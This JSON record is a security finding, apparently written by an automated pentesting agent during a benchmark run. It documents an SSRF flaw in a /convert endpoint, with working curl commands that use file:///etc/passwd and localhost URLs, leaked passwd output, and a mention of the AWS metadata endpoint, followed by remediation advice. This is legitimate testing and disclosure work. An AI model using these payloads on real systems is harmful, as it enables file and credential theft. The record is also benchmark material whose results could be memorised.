{
  "title": "Server-Side Request Forgery (SSRF) with Local File Access",
  "severity": "CRITICAL",
  "description": "The url parameter in the /convert endpoint is vulnerable to Server-Side Request Forgery (SSRF). The application fetches content from user-supplied URLs without proper validation or restriction. The application supports the file:// protocol, allowing arbitrary local file read access. An attacker can read sensitive files from the server including configuration files, source code, credentials, and system files. The vulnerability also permits requests to internal network services and metadata endpoints.",
  "impact": "Critical security impact enabling:\n1. Arbitrary local file read access - /etc/passwd, /etc/shadow, application configs with credentials, source code, private keys\n2. Access to internal services and metadata endpoints (e.g., AWS metadata at 169.254.169.254)\n3. Internal network reconnaissance and probing\n4. Potential code execution if sensitive files are accessed or combined with other vulnerabilities\n5. Complete compromise of application and potentially host system",
  "endpoint": "http://localhost:80/convert",
  "evidence": "POC Execution Results:\n\n**Test 1 - Localhost SSRF (HTTP 200):**\nCommand: curl -X POST http://localhost:80/convert -d 'url=http://127.0.0.1:80'\nResult: Successfully fetched full HTML markup from localhost, proving arbitrary URL fetching capability\n\n**Test 2 - /etc/passwd File Read via file:// (HTTP 200) - CRITICAL:**\nCommand: curl -X POST http://localhost:80/convert -d 'url=file:///etc/passwd'\nResult: Successfully read and returned /etc/passwd containing:\n- root:x:0:0:root:/root:/bin/bash\n- daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n- bin:x:2:2:bin:/bin:/usr/sbin/nologin\n- sync:x:4:65534:sync:/bin:/bin/sync\n- proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n\nThe application directly renders fetched content without any validation, filtering, or protocol restrictions. The file:// protocol is enabled and fully functional for reading local files.",
  "pocPath": "pocs/poc_ssrf_local_file_read.sh",
  "remediation": "1. **Implement URL scheme whitelist** - Only allow http:// and https:// protocols, explicitly disable file://, ftp://, gopher://, and other dangerous protocols\n2. **Implement strict URL validation** - Validate and whitelist allowed destination hostnames/domains\n3. **Block private IP ranges** - Reject requests to 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254 (AWS metadata)\n4. **Use secure HTTP client library** - Employ libraries with built-in SSRF prevention\n5. **Implement network segmentation** - Restrict outbound connections from application server\n6. **Add request timeouts** - Prevent prolonged/hanging requests\n7. **Enable audit logging** - Log all outbound requests for monitoring and alerting\n8. **Use SSRF prevention library** - Consider libraries like ssrf-guard or similar SSRF mitigation frameworks",
  "references": "OWASP Top 10: A01:2021 - Broken Access Control\nCWE-918: Server-Side Request Forgery (SSRF)\nCWE-73: External Control of File Name or Path\nCVSS v3.1 Base Score: 9.1 (Critical)",
  "toolCallDescription": "Documenting confirmed SSRF vulnerability with working POC demonstrating /etc/passwd file read",
  "timestamp": "2025-11-04T17:30:00.038Z",
  "sessionId": "benchmark-XBEN-033-24-mhkubvue",
  "target": "./repo"
}